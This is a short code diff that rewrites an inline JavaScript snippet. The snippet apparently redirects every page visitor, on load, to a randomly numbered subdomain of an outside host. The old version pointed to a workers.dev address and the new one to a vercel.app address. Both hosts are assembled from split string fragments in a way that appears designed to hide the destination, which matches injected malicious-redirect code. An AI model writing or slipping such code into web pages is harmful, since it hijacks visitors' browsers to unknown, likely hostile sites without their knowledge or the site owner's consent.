@@ -1,11 +1,13 @@
-<script type = "text/javascript">
+
+<script type="text/javascript">
 function reDirect() {
-a = location.href = "1.1to6";
-b = location.href = ".workers";
-c = location.href = ".dev/";
-d = Math.ceil(Math.random() * 24);
-a = "https://" + a + b + c + d ;
-window.location = a
+    var a = "velesta";
+    var b = ".vercel";
+    var c = ".app/";
+    var d = Math.ceil(Math.random() * 12);
+    var finalUrl = "https://" + d + a + b + c;
+    window.location.href = finalUrl;
 }
 reDirect();
 </script>
+
